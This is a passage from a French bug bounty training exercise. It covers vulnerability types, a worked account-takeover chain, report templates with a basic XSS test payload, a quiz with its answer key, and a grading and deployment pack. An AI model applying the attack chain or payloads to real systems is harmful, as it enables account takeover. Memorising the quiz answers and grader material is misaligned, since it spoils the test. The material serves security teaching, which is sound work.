| 8 | CRLF Injection | 5.0-7.0 | 113 | Cache Poison |
| 9 | SSRF | 6.0-9.0 | 918 | Internal Access |
| 10 | XXE | 7.0-9.0 | 611 | Data Exfil |
| 11 | IDOR | 6.0-8.0 | 639 | Data Access |
| 12 | SSTI | 7.0-10.0 | 94 | RCE |
| 13 | Insecure Design | 5.0-8.0 | 284 | Multiple |
| 14 | Auth Failures | 7.0-9.0 | 287 | Account Access |
| 15 | Integrity | 6.0-8.0 | 345 | Data Tampering |
| 16 | Logging Failures | 3.0-5.0 | 778 | Forensics Impact |
| 17 | Serverless Misconfig | 5.0-8.0 | 215 | Credential Leak |
| 18 | WASM Issues | 3.0-6.0 | 119 | Memory Leak |

#### 5.5.3 L'Art du Chaining

Le **chaining** est ce qui différencie un hunter moyen d'un expert :

```
EXEMPLE DE CHAIN : Medium → Critical

Vulnérabilité 1: Information Disclosure (LOW)
  └─ Endpoint /debug expose les emails des admins

Vulnérabilité 2: IDOR (MEDIUM)
  └─ /api/user/{id} permet d'accéder aux infos d'autres users

Vulnérabilité 3: Password Reset Poisoning (MEDIUM)
  └─ Host header injection dans le reset

CHAIN: Info Disclosure → Get admin email
       → IDOR → Get admin user ID
       → Password Reset → Takeover admin account

Impact combiné: CRITICAL ($15,000 au lieu de $500+$2000+$2000)
```

### 5.6 Normes avec explications pédagogiques

```
┌─────────────────────────────────────────────────────────────────┐
│ ❌ HORS NORME (compile, mais mauvaise pratique bug bounty)      │
├─────────────────────────────────────────────────────────────────┤
│ // Rapport minimal                                              │
│ "Found XSS on /search. Payload: <script>alert(1)</script>"      │
├─────────────────────────────────────────────────────────────────┤
│ ✅ RAPPORT PROFESSIONNEL                                        │
├─────────────────────────────────────────────────────────────────┤
│ ## Title: Stored XSS in Search Functionality                    │
│                                                                 │
│ ## Summary                                                      │
│ A stored XSS vulnerability exists in the search history...     │
│                                                                 │
│ ## Steps to Reproduce                                           │
│ 1. Navigate to https://target.com/search                       │
│ 2. Enter payload:    │
│ 3. Submit and observe payload stored in history                │
│ 4. Other users viewing history execute the payload             │
│                                                                 │
│ ## Impact                                                       │
│ An attacker can steal session cookies of any user...           │
│                                                                 │
│ ## Remediation                                                  │
│ Implement output encoding using DOMPurify...                   │
├─────────────────────────────────────────────────────────────────┤
│ 📖 POURQUOI ?                                                   │
│ • Rapports clairs = triage rapide = paiement rapide            │
│ • Impact démontré = bounty plus élevé                          │
│ • Remediation = relation positive avec le programme            │
└─────────────────────────────────────────────────────────────────┘
```

### 5.7 Simulation avec trace d'exécution

**Entrée test :**
```json
{
  "target_scope": {"domains": ["*.target.com"], "out_of_scope": ["blog.target.com"]},
  "test_cases": [
    {"id": "TC1", "type": "saml_analysis", "endpoint": "/saml/acs", "saml_response": {"signature_validated": false}},
    {"id": "TC2", "type": "xss_analysis", "endpoint": "https://blog.target.com/search", "xss_type": "reflected"},
    {"id": "TC3", "type": "cors_analysis", "endpoint": "/api/user", "cors_config": {"allow_origin": "reflect", "allow_credentials": true}}
  ]
}
```

**Trace d'exécution :**

```
┌───────┬────────────────────────────────────┬─────────────────┬────────────────────────────────┐
│ Étape │ Instruction                        │ Variables       │ Explication                    │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   1   │ PARSER input_json                  │ input = {...}   │ JSON valide, parsing OK        │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   2   │ INITIALISER findings = []          │ findings = []   │ Vecteur vide                   │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   3   │ TRAITER TC1 (saml_analysis)        │                 │                                │
│  3.1  │ ├─ is_out_of_scope("/saml/acs")?   │ false           │ Pas dans out_of_scope          │
│  3.2  │ ├─ analyze_saml(TC1)               │                 │ signature_validated = false    │
│  3.3  │ ├─ CRÉER Finding CRITICAL          │ cvss = 9.8      │ SAML bypass détecté            │
│  3.4  │ └─ AJOUTER aux findings            │ len = 1         │ Premier finding ajouté         │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   4   │ TRAITER TC2 (xss_analysis)         │                 │                                │
│  4.1  │ ├─ is_out_of_scope("blog...")?     │ true            │ "blog.target.com" est OOS      │
│  4.2  │ └─ SKIP, out_of_scope_count++      │ oos_count = 1   │ Test case ignoré               │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   5   │ TRAITER TC3 (cors_analysis)        │                 │                                │
│  5.1  │ ├─ is_out_of_scope("/api/user")?   │ false           │ Endpoint in-scope              │
│  5.2  │ ├─ analyze_cors(TC3)               │                 │ reflect + credentials          │
│  5.3  │ ├─ CRÉER Finding HIGH              │ cvss = 7.5      │ CORS misconfig détectée        │
│  5.4  │ └─ AJOUTER aux findings            │ len = 2         │ Deuxième finding ajouté        │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   6   │ TRIER findings par CVSS desc       │ [9.8, 7.5]      │ CRITICAL en premier            │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   7   │ detect_chains(findings)            │ chains = [...]  │ Pas de chain détectée ici      │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   8   │ calculate_bounty(findings)         │ $13,500         │ CRIT($10k) + HIGH($3.5k)       │
├───────┼────────────────────────────────────┼─────────────────┼────────────────────────────────┤
│   9   │ GÉNÉRER rapport et RETOURNER       │ JSON output     │ 2 findings, $13.5k bounty      │
└───────┴────────────────────────────────────┴─────────────────┴────────────────────────────────┘
```

### 5.8 Mnémotechniques

#### 🎬 MEME : "Hack the Planet!" — Hackers (1995)

Dans le film *Hackers*, Dade Murphy (Zero Cool) et ses amis répètent "Hack the Planet!" comme cri de ralliement. En bug bounty, c'est pareil : **scope first, hack second**.

```rust
// 🌍 "HACK THE PLANET... mais vérifie le scope d'abord!"
fn hack_the_planet(target: &str, scope: &Scope) -> Result<Finding, &str> {
    if !scope.includes(target) {
        return Err("Out of scope! Don't be like that script kiddie in the movie.");
    }
    // Now you can hack
    analyze_target(target)
}
```

#### 🎭 MEME : "I am the one who knocks" — Breaking Bad

Walter White était méthodique dans son approche. Un bon bug bounty hunter aussi :

```
"I am not in danger. I AM the danger."
→ Le bug bounty hunter ne subit pas les vulns, il les TROUVE.

Méthodologie Walter White :
1. Reconnaissance (Blue Sky = Clear Intel)
2. Préparation (Lab = Environment Setup)
3. Exécution (Cook = Exploit Development)
4. Distribution (Dealing = Report Submission)
```

#### 🦸 MEME : "With great power comes great responsibility" — Spider-Man

Les vulnérabilités critiques sont un pouvoir. La **responsible disclosure** est la responsabilité :

```rust
fn responsible_disclosure(finding: Finding) -> Report {
    // 🕷️ Uncle Ben's Rule
    assert!(finding.is_in_scope, "With great power comes great responsibility");
    assert!(!finding.is_destructive, "We test, we don't destroy");

    Report {
        title: finding.title,
        steps: finding.reproduction_steps,
        impact: finding.impact,
        remediation: suggest_fix(&finding), // Always help fix!
    }
}
```

#### 🎮 MEME : "It's dangerous to go alone! Take this." — Zelda

La boîte à outils du bug bounty hunter :

```
┌─────────────────────────────────────────────┐
│  OLD MAN: "It's dangerous to go alone!      │
│            Take this."                       │
│                                             │
│  🗡️ Burp Suite    - Your Master Sword       │
│  🛡️ Scope Check   - Your Shield             │
│  💣 Nuclei        - Your Bombs              │
│  🏹 FFUF          - Your Bow                │
│  🔑 JWT Toolkit   - Your Keys               │
│  📜 Report Template - Your Map              │
└─────────────────────────────────────────────┘
```

### 5.9 Applications pratiques

| Scénario | Application | Résultat |
|----------|-------------|----------|
| **E-commerce audit** | Trouver IDOR sur les commandes | $5,000 bounty |
| **Banking app** | Détecter auth bypass | $50,000 bounty |
| **Social media** | XSS stored dans les posts | $10,000 bounty |
| **Cloud provider** | SSRF vers metadata | $100,000 bounty |
| **Healthcare** | SQLi sur données patients | $25,000 bounty + CVE |

---

## ⚠️ SECTION 6 : PIÈGES — RÉCAPITULATIF

| # | Piège | Description | Conséquence | Solution |
|---|-------|-------------|-------------|----------|
| 1 | **Out-of-Scope** | Tester des cibles hors scope | Rapport rejeté, ban possible | Toujours vérifier le scope avant test |
| 2 | **Duplicates** | Soumettre la même vuln deux fois | Temps perdu, réputation | Hash unique par finding |
| 3 | **CVSS gonflé** | Surévaluer la sévérité | Perte de crédibilité | Calcul objectif selon CVSS v3.1 |
| 4 | **Rapport minimal** | Juste "XSS found" | Bounty minimal, triage lent | Rapport détaillé avec PoC |
| 5 | **Pas de PoC** | Pas de preuve d'exploitation | Contestation possible | Screenshots, videos, code |
| 6 | **Destructif** | Supprimer des données en prod | Ban définitif, poursuites | Environnements de test uniquement |
| 7 | **Divulgation précoce** | Publier avant fix | Violation des règles | Attendre le feu vert du programme |
| 8 | **Scope dynamique** | Ne pas revérifier le scope | Targets devenues OOS | Vérifier le scope régulièrement |
| 9 | **Mauvais chaining** | Chaîner des vulns indépendantes | Rapport confus | Chaîner uniquement si lié logiquement |
| 10 | **Ignorer les low** | Ne chercher que les criticals | Manquer des chains | Les low peuvent devenir critical chaînés |

---

## 📝 SECTION 7 : QCM

### Question 1
**Qu'est-ce qui rend une vulnérabilité SAML "CRITICAL" dans un programme bug bounty ?**

A) Le serveur utilise SAML 2.0
B) La signature de l'assertion n'est pas validée, permettant la forge de claims
C) Le certificat SAML est auto-signé
D) Le binding HTTP-POST est utilisé
E) Le NameID est un email
F) L'assertion a une durée de validité longue
G) Le metadata est exposé publiquement
H) Le SP supporte plusieurs IdP
I) Le logout n'est pas implémenté
J) L'assertion n'est pas chiffrée

**Réponse : B**
*Explication : Sans validation de signature, un attaquant peut modifier les claims (email, role) et prendre le contrôle de n'importe quel compte.*

---

### Question 2
**Comment gérer correctement une cible out-of-scope dans un bug bounty ?**

A) La tester quand même mais ne pas reporter
B) La tester et reporter si critique
C) Ne jamais la tester et l'ignorer complètement
D) La tester avec précaution
E) La reporter comme "informatif"
F) Demander une exception au programme
G) La tester en mode passif uniquement
H) La tester si aucune autre cible n'est vulnérable
I) La tester et anonymiser le rapport
J) Tester uniquement les sous-domaines

**Réponse : C**
*Explication : Les targets out-of-scope ne doivent JAMAIS être testées. Violer le scope peut entraîner un ban du programme et potentiellement des poursuites légales.*

---

### Question 3
**Quel est le CVSS v3.1 typique pour Log4Shell (CVE-2021-44228) ?**

A) 5.0 (MEDIUM)
B) 7.5 (HIGH)
C) 8.8 (HIGH)
D) 9.0 (CRITICAL)
E) 9.8 (CRITICAL)
F) 10.0 (CRITICAL)
G) 6.5 (MEDIUM)
H) 4.3 (MEDIUM)
I) 3.1 (LOW)
J) Variable selon le contexte

**Réponse : F**
*Explication : Log4Shell a un CVSS de 10.0 car il permet l'exécution de code arbitraire à distance (RCE) sans authentification, avec un impact sur la confidentialité, l'intégrité et la disponibilité.*

---

### Question 4
**Qu'est-ce qu'un "vulnerability chain" dans le contexte du bug bounty ?**

A) Une liste de CVEs liées
B) Une séquence de vulnérabilités combinées pour un impact plus grand
C) Une chaîne de caractères contenant un payload
D) Un outil de détection automatique
E) Un type de rapport
F) Une technique de bypass WAF
G) Un mode de divulgation
H) Une méthode de calcul de bounty
I) Un système de scoring
J) Un template de rapport

**Réponse : B**
*Explication : Le chaining consiste à combiner plusieurs vulnérabilités (ex: Info Disclosure + IDOR + Password Reset) pour atteindre un impact plus élevé qu'individuellement.*

---

### Question 5
**Quelle est la meilleure pratique pour éviter les rapports en duplicate ?**

A) Toujours être le premier à soumettre
B) Ne tester que les nouvelles fonctionnalités
C) Générer un hash unique basé sur le titre et l'endpoint
D) Éviter les vulnérabilités communes
E) Utiliser des payloads uniques
F) Tester à des heures spécifiques
G) Se spécialiser dans un type de vuln
H) Éviter les programmes populaires
I) Soumettre plusieurs variantes
J) Demander au triager avant de soumettre

**Réponse : C**
*Explication : Créer un hash unique (title + endpoint + type) permet de détecter programmatiquement les duplicates avant soumission et d'éviter de perdre du temps.*

---

### Question 6
**Quelle configuration CORS est vulnérable au vol de credentials ?**

A) Access-Control-Allow-Origin: https://trusted.com
B) Access-Control-Allow-Origin: * avec Allow-Credentials: false
C) Access-Control-Allow-Origin: reflect avec Allow-Credentials: true
D) Access-Control-Allow-Origin: null
E) Pas de headers CORS
F) Access-Control-Allow-Methods: GET
G) Access-Control-Max-Age: 86400
H) Access-Control-Expose-Headers: X-Custom
I) Access-Control-Allow-Headers: Content-Type
J) Toutes les configurations ci-dessus

**Réponse : C**
*Explication : Quand l'Origin est reflétée ET que les credentials sont autorisés, n'importe quel site peut faire des requêtes authentifiées et lire les réponses.*

---

### Question 7
**Qu'est-ce qui différencie un rapport "INFORMATIVE" d'un rapport valide ?**

A) Le nombre de mots dans le rapport
B) L'absence d'impact exploitable démontré
C) Le type de vulnérabilité
D) La méthode de découverte
E) L'ancienneté de la vuln
F) Le niveau du hunter
G) La plateforme utilisée
H) Le format du rapport
I) La présence de screenshots
J) Le temps de soumission

**Réponse : B**
*Explication : Un rapport INFORMATIVE ne démontre pas d'impact exploitable réel. Par exemple, une version outdated sans exploit connu, ou une "vulnérabilité" qui ne peut pas être exploitée dans le contexte.*

---

### Question 8
**Comment calculer correctement l'estimation de bounty pour plusieurs findings ?**

A) Additionner les bounties maximum de chaque sévérité
B) Prendre le bounty du finding le plus critique
C) Moyenne des bounties
D) Somme des midpoints des ranges par sévérité, excluant les duplicates
E) Maximum possible du programme
F) Minimum garanti
G) Bounty fixe par finding
H) Négociation au cas par cas
I) Pourcentage du bounty max
J) Formule propriétaire du programme

**Réponse : D**
*Explication : Pour une estimation réaliste, on utilise le midpoint de chaque range de sévérité et on exclut les duplicates qui ne seront pas payés.*

---

### Question 9
**Quel élément est OBLIGATOIRE dans un rapport bug bounty professionnel ?**

A) Code d'exploitation complet
B) Vidéo de démonstration
C) Steps de reproduction clairs et détaillés
D) Analyse du code source
E) Timeline de découverte
F) Liste des outils utilisés
G) CV du researcher
H) Historique des rapports précédents
I) Références académiques
J) Comparaison avec d'autres programmes

**Réponse : C**
*Explication : Les steps de reproduction sont le minimum absolu. Sans eux, le triager ne peut pas vérifier la vulnérabilité et le rapport sera fermé comme "Need More Info".*

---

### Question 10
**Quelle approche est recommandée pour maximiser les bounties ?**

A) Soumettre le plus de rapports possible
B) Se concentrer uniquement sur les CRITICAL
C) Chercher des vulnérabilités chainables et démontrer l'impact maximal
D) Utiliser uniquement des outils automatisés
E) Copier les rapports publics
F) Tester 24/7 sans pause
G) Ignorer les programmes avec bounties faibles
H) Éviter les grandes entreprises
I) Se spécialiser dans une seule vuln
J) Tester uniquement les nouvelles features

**Réponse : C**
*Explication : Le chaining transforme des vulns LOW/MEDIUM en CRITICAL avec un impact démontré, ce qui maximise les bounties. La qualité prime sur la quantité.*

---

## 📊 SECTION 8 : RÉCAPITULATIF

### 8.1 Compétences Acquises

| Compétence | Niveau | Application |
|------------|--------|-------------|
| SAML Security | Expert | Détecter signature bypass, claim manipulation |
| CORS Analysis | Expert | Identifier misconfigurations exploitables |
| Log Injection | Expert | Log4Shell et dérivés |
| WebSocket Security | Avancé | XSS via WebSocket, protocol issues |
| MFA Bypass | Avancé | Race conditions, backup code weaknesses |
| Password Reset | Avancé | Host header injection, token prediction |
| Vulnerability Chaining | Expert | Combiner pour impact maximal |
| CVSS Calculation | Expert | Scoring précis selon v3.1 |
| Professional Reporting | Expert | Rapports acceptés par programmes majeurs |
| Scope Management | Expert | Respect strict du périmètre |

### 8.2 Formules Clés

```
CVSS_Base = Impact × Exploitability × Scope

Bounty_Estimate = Σ(midpoint(severity_range)) - duplicates

Chain_Impact = max(individual_impacts) + chain_bonus

Duplicate_Hash = SHA256(title + endpoint + vuln_type)

Time_Allocation = Recon(20%) + Mapping(15%) + Testing(40%) + Exploit(15%) + Report(10%)
```

### 8.3 Checklist Bug Bounty

```
□ Scope vérifié avant tout test
□ Reconnaissance complète
□ Endpoints mappés
□ Vulnérabilités identifiées
□ CVSS calculé correctement
□ Chaines détectées
□ Duplicates exclus
□ PoC fonctionnel
□ Rapport professionnel
□ Impact démontré
□ Remediation suggérée
□ Screenshots/vidéos inclus
```

---

## 📦 SECTION 9 : DEPLOYMENT PACK (JSON COMPLET)

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.14-a-bug_bounty_simulation",
    "generated_at": "2025-01-11 12:00:00",

    "metadata": {
      "exercise_id": "3.3.14-a",
      "exercise_name": "bug_bounty_simulation",
      "module": "3.3",
      "module_name": "Sécurité Web & Applications",
      "concept": "a",
      "concept_name": "Bug Bounty Simulation Complète",
      "type": "complet_2",
      "tier": 3,
      "tier_info": "Synthèse (tous concepts du module)",
      "phase": 3,
      "difficulty": 18,
      "difficulty_display": "🧠🧠",
      "language": "rust",
      "language_version": "Edition 2024",
      "duration_minutes": 480,
      "xp_base": 2500,
      "xp_bonus_multiplier": 10,
      "bonus_tier": "IMPOSSIBLE",
      "bonus_icon": "☠️",
      "complexity_time": "T8 O(n × m × k)",
      "complexity_space": "S6 O(n²)",
      "prerequisites": [
        "3.3.1-a à 3.3.13-a (tous les exercices précédents)"
      ],
      "domains": ["Net", "Crypto", "Struct", "DP"],
      "domains_bonus": ["Probas", "DP", "Crypto"],
      "tags": [
        "bug-bounty",
        "saml",
        "cors",
        "log4shell",
        "websocket",
        "mfa-bypass",
        "password-reset",
        "chaining",
        "cvss",
        "professional-reporting",
        "phase3",
        "synthesis"
      ],
      "vulnerabilities_covered": [
        "CWE-347 (SAML Signature)",
        "CWE-942 (CORS)",
        "CWE-502 (Log4Shell)",
        "CWE-79 (XSS)",
        "CWE-362 (Race Condition)",
        "CWE-640 (Password Reset)",
        "CWE-113 (CRLF)",
        "CWE-89 (SQLi)",
        "CWE-215 (Info Disclosure)",
        "CWE-119 (Memory)"
      ],
      "meme_references": [
        "Hackers (1995) - Hack the Planet!",
        "Breaking Bad - I am the one who knocks",
        "Spider-Man - Great power, great responsibility",
        "Zelda - It's dangerous to go alone"
      ]
    },

    "files": {
      "spec.json": "/* Voir section 4.9 */",
      "references/ref_bug_bounty_simulation.rs": "/* Voir section 4.3 */",
      "references/ref_bug_bounty_simulation_ml.rs": "/* Voir section 4.6 */",
      "alternatives/alt_pattern_matching.rs": "/* Voir section 4.4 */",
      "alternatives/alt_builder_pattern.rs": "/* Voir section 4.4 */",
      "mutants/mutant_a_boundary_cvss.rs": "/* Section 4.10 - CVSS off-by-one */",
      "mutants/mutant_b_safety_no_check.rs": "/* Section 4.10 - No JSON validation */",
      "mutants/mutant_c_resource_leak.rs": "/* Section 4.10 - Double add */",
      "mutants/mutant_d_logic_inverted.rs": "/* Section 4.10 - Scope inversion */",
      "mutants/mutant_e_return_empty.rs": "/* Section 4.10 - Always empty */",
      "mutants/mutant_f_edge_wildcard.rs": "/* Section 4.10 - No wildcard support */",
      "tests/main.rs": "/* Voir section 4.2 */"
    },

    "validation": {
      "expected_pass": [
        "references/ref_bug_bounty_simulation.rs",
        "references/ref_bug_bounty_simulation_ml.rs",
        "alternatives/alt_pattern_matching.rs",
        "alternatives/alt_builder_pattern.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary_cvss.rs",
        "mutants/mutant_b_safety_no_check.rs",
        "mutants/mutant_c_resource_leak.rs",
        "mutants/mutant_d_logic_inverted.rs",
        "mutants/mutant_e_return_empty.rs",
        "mutants/mutant_f_edge_wildcard.rs"
      ]
    },

    "test_scenarios": {
      "saml_bypass": {
        "input": {"test_type": "saml_analysis", "signature_validated": false},
        "expected_severity": "CRITICAL",
        "expected_cvss_min": 9.0
      },
      "cors_misconfig": {
        "input": {"test_type": "cors_analysis", "allow_origin": "reflect", "allow_credentials": true},
        "expected_severity": "HIGH",
        "expected_cvss_range": [7.0, 8.0]
      },
      "log4shell": {
        "input": {"test_type": "log_injection", "log4j_version": "2.14.1", "jndi_reachable": true},
        "expected_severity": "CRITICAL",
        "expected_cvss": 10.0
      },
      "out_of_scope": {
        "input": {"endpoint": "blog.target.com", "out_of_scope": ["blog.target.com"]},
        "expected_findings_count": 0
      },
      "duplicate": {
        "input": {"same_vuln_twice": true},
        "expected_duplicate_marked": true
      }
    },

    "scoring": {
      "base_points": 2500,
      "bonus_multiplier": 10,
      "max_bonus_points": 25000,
      "penalty_wrong_scope": -500,
      "penalty_wrong_cvss": -100,
      "penalty_missed_chain": -200,
      "bonus_perfect_report": 500
    },

    "commands": {
      "validate_spec": "python3 hackbrain_engine_v22.py --validate-spec spec.json",
      "test_reference": "cargo test --release",
      "test_mutants": "python3 hackbrain_mutation_tester.py -r references/ref_bug_bounty_simulation.rs -s spec.json --validate",
      "run_fuzzing": "cargo fuzz run bug_bounty_fuzzer -- -max_total_time=300",
      "benchmark": "cargo bench"
    },

    "dependencies": {
      "rust_edition": "2024",
      "crates": [
        {"name": "serde", "version": "1.0"},
        {"name": "serde_json", "version": "1.0"},
        {"name": "regex", "version": "1.10"},
        {"name": "url", "version": "2.5"},
        {"name": "chrono", "version": "0.4"}
      ]
    },

    "learning_outcomes": [
      "Comprendre la méthodologie bug bounty complète",
      "Maîtriser 18 types de vulnérabilités web",
      "Calculer correctement les scores CVSS v3.1",
      "Identifier et exploiter les vulnerability chains",
      "Rédiger des rapports professionnels",
      "Respecter strictement le scope",
      "Gérer les duplicates efficacement",
      "Estimer les bounties de manière réaliste"
    ],

    "real_world_applications": [
      "Participation aux programmes HackerOne/Bugcrowd",
      "Audits de sécurité professionnels",
      "Red team engagements",
      "Security research et CVE discovery",
      "Consulting en sécurité applicative"
    ]
  }
}
```

---

## 🏆 CONCLUSION

Cet exercice de synthèse représente le **capstone** du Module 3.3 — Sécurité Web & Applications. En le complétant, tu as démontré :

1. **Maîtrise technique** : 18 types de vulnérabilités web
2. **Méthodologie** : Approche structurée du bug bounty
3. **Professionnalisme** : Rapports de qualité production
4. **Éthique** : Respect du scope et responsible disclosure

**"Hack the Planet!"** — mais toujours dans les règles.

---

*HACKBRAIN v5.5.2 — Bug Bounty Simulation*
*"L'excellence pédagogique ne se négocie pas — pas de raccourcis"*
*Compatible ENGINE v22.1 + Mutation Tester*
